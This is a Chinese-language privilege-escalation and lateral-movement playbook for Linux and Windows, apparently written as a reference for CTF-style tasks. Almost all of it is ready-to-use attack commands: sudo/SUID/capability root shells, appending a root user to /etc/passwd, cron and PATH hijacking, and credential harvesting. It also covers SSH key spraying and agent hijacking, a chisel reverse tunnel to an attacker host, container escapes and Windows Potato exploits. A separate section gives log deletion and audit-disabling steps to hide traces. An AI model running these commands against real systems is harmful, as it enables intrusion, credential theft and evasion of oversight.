# Linux/Windows 提权与横向移动手册

适用题型（命中即召回本手册）：Linux提权 权限提升 SUID SGID capabilities cron 计划任务 PATH劫持 内核漏洞 敏感文件 明文凭据 横向移动 内网隧道 SSH动态转发 chisel socat 端口复用 容器逃逸 docker.sock 特权容器 cap_sys_admin 沙箱逃逸 Windows提权 Potato

## 1. 识别与分类
- 先定处境：容器内还是真机（cat /proc/1/cgroup 含 docker/kubepods、ls /.dockerenv、hostname 随机串）；Linux 用 uname -a / id / sudo -l，Windows 用 whoami /priv。
- 提权三连：sudo -l 有无 NOPASSWD 条目 → find SUID/SGID → getcap 有无 cap_setuid/cap_sys_admin；三者皆空再看 cron、可写敏感文件、内核版本。
- 横向判据：拿到本机私钥/凭据/agent 后，靠 known_hosts、/proc/*/environ、内网 arp/ip neigh 找下一跳与共享文件系统。

## 2. 攻击方法论
1. 基线枚举：id; sudo -l; uname -a; find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null; getcap -r / 2>/dev/null; ss -tlnp; env | grep -iE "pass|key|token|secret"。
2. sudo 白名单滥用：允许跑 find/vim/less/awk/python/env 时直接提权，如 sudo find . -exec /bin/sh -p \; -quit、sudo python3 -c 'import os;os.execl("/bin/sh","sh","-p")'、sudo vim -c ':!/bin/sh'；env_keep+=LD_PRELOAD 时编译 .so 注入。
3. SUID/SGID：对每个 -4000 二进制查 GTFOBins 的 SUID 条目；自定义 SUID 用 strace/ltrace 找其加载的相对 .so 或命令，往可写路径放同名库（__attribute__((constructor)) 内 setuid(0)+system）。
4. capabilities：cap_setuid → python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'；cap_dac_override/cap_dac_read_search → 读 /etc/shadow 或改写 /etc/passwd；cap_fowner 改文件属主。
5. cron/计划任务：cat /etc/crontab + ls -la /etc/cron.*；root 跑的可写脚本追加 "cp /bin/bash /tmp/b && chmod +s /tmp/b"；脚本里相对命令名（无全路径）→ PATH 劫持放同名脚本；tar 通配符 → 造 --checkpoint=1 与 --checkpoint-action=exec=sh shell.sh 文件。
6. 敏感文件与明文凭据：遍历 ~/.bash_history ~/.mysql_history .my.cnf .pgpass .netrc .git-credentials id_rsa *.pem *.key .env wp-config.php settings.py；root 时读 /proc/[0-9]*/environ 抓服务进程 env 凭据。
7. 可写关键文件：/etc/passwd 可写 → openssl passwd -1 -salt x pass 生成 hash 追加 uid=0 用户；/etc/shadow 可写 → 替换 root hash；systemd unit 可写 → ExecStartPre 注入。
8. 内核漏洞：uname -r 对本地 CVE 库——DirtyCow(CVE-2016-5195)、DirtyPipe(CVE-2022-0847, 5.8+)、PwnKit(CVE-2021-4034 pkexec)、OverlayFS(CVE-2023-2640/32629 Ubuntu)；编译静态 C 放 /tmp 执行。
9. 横向移动：ssh-keygen -y -P "" -f key 探测无口令私钥 → 喷 known_hosts 提取的主机；echo pubkey >> authorized_keys 播种；劫持 SSH agent（export SSH_AUTH_SOCK=/tmp/ssh-*/agent.* 后 ssh-add -l）。
10. 隧道与端口复用：ssh -D 1080 pivot -N（SOCKS）+ proxychains；ssh -L 3306:INTERNAL:3306 / -R / -J 多跳；无 ssh 用 chisel（攻击机 chisel server -p 8080 --reverse，目标 chisel client ATTACKER:8080 R:socks）、socat TCP-LISTEN:8080,fork TCP:INTERNAL:80、/dev/tcp 无工具扫端口。
11. 容器逃逸判别与利用：特权容器(CapEff 全 f) → mount /dev/sda1 + chroot /mnt 或 nsenter -t 1 -m -u -i -n -p -- bash；挂载 docker.sock → curl --unix-socket 建 Binds+Privileged 特权容器；docker group → docker run -v /:/mnt chroot；cap_sys_admin + cgroup v1 → release_agent 逃逸；hostPID → ls /proc/1/root 直读宿主机文件。
12. NFS 与共享文件系统：showmount -e T 找导出；/etc/exports 含 no_root_squash → 攻击机 mount -t nfs T:/share /mnt 后放 SUID bash（cp /bin/bash + chmod +s），共享该目录的所有主机都能 /share/bash -p 提权。
13. 运行库/路径劫持：root 脚本 import 相对模块时，把恶意同名模块放到 PYTHONPATH/PERL5LIB/RUBYLIB 里靠前的可写路径；sudo env_keep+=LD_PRELOAD 时编译构造器 .so 注入；SUID 二进制用 strace 找相对 .so 路径放同名库。

## 3. 变体与绕过
- 只读/noexec：脚本解释器仍可跑（python/bash 把脚本当数据读）；ELF 挪 /dev/shm 执行；/lib64/ld-linux-x86-64.so.2 /path/bin 或 memfd_create 绕过 noexec；DDexec 走 /proc/self/mem 无文件落地。
- rbash 受限 shell：python3 -c 'import pty;pty.spawn("/bin/bash")'、vi :!/bin/bash、find -exec、env /bin/bash、BASH_CMDS[x]=/bin/bash。
- 无交互/无回显：优先落盘提权物（SUID bash、cron 反连）等触发；pspy 无 root 监控进程发现隐藏 cron/服务。
- Windows 提权要点：whoami /priv 见 SeImpersonatePrivilege → Potato 族（GodPotato/PrintSpoofer/JuicyPotato 按 OS 版本选）；wmic 查 unquoted service path + icacls 查可写 binpath；AlwaysInstallElevated 两键=1 → msfvenom msi 提权；DLL 劫持找缺失 DLL 路径；cmdkey /list + runas /savecred。
- 沙箱/容器逃逸思路：pyjail 走 ().__class__.__bases__[0].__subclasses__() 找 os 取 system；chroot 逃逸用双 chroot/fchdir 泄露 fd/TIOCSTI；seccomp 用 32 位 syscall 架构混淆；AppArmor/SELinux 先查 aa-status / getenforce 找 complain/permissive 域。
- 自动化兜底：linpeas/winPEAS 全量枚举 + linux-exploit-suggester 对内核版本给 exp 建议；离线环境用内置脚本替代联网下载。
- 痕迹规避：touch -r 参考文件改时间戳、sed -i 删 auth.log 记录、exec -a 伪装进程名、auditctl -e 0 关审计（root）。

## 战法要点
- 落 shell 后 30 秒内跑完基线枚举再选路，别上来就试内核 exp。
- sudo -l 有条目 → 先打 GTFOBins，成本最低；cap_setuid/cap_dac_override 是秒级 root。
- 提权物一律先落盘（SUID bash）再等 cron/触发，别只赌一次交互。
- 横向优先复用已到手私钥/凭据喷全段，比新打漏洞快；隧道选型看出网能力。
- 容器内先判别 (cgroup/dockerenv) 再选逃逸链，别把容器当主机打内核 exp。
- 只读环境首选 /dev/shm + 解释器脚本，不硬刚 noexec。
- 内核 exp 是最后手段：先试配置类（sudo/SUID/cap/cron），成功率更高且不崩服务。

## 速查清单
```text
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
getcap -r / 2>/dev/null
sudo find . -exec /bin/sh -p \; -quit
sudo python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
echo 'hacker:$1$x$hash:0:0::/root:/bin/bash' >> /etc/passwd
echo 'cp /bin/bash /tmp/b&&chmod +s /tmp/b' >> /writable/cron.sh
showmount -e T
ssh -D 1080 pivot -N && proxychains nmap -sT 10.0.0.0/24
chisel server -p 8080 --reverse      # 攻击机
chisel client ATTACKER:8080 R:socks  # 目标机
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80 &
nsenter -t 1 -m -u -i -n -p -- bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
PrintSpoofer64.exe -i -c cmd
```
